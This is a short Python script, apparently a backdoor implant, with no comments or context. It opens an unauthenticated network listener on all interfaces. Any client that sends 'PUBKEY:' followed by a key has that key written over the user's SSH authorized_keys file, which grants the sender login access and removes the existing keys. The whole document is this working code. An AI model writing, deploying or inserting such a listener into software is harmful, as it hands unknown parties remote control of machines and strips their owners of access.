#!/usr/bin/env python3
import os
import socket
import sys

PORT = int(sys.argv[1])
path = os.path.expanduser("~/.ssh/authorized_keys")
os.makedirs(os.path.dirname(path), exist_ok=True)
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", PORT))
sock.listen(5)
while True:
    conn, _ = sock.accept()
    try:
        data = conn.recv(65535).decode(errors="replace")
        if "PUBKEY:" in data:
            key = data.split("PUBKEY:", 1)[1].strip()
            with open(path, "w") as fh:
                fh.write(key + "\n")
            os.chmod(path, 0o600)
            conn.sendall(b"+OK\n")
        else:
            conn.sendall(b"+OK\n")
    finally:
        conn.close()
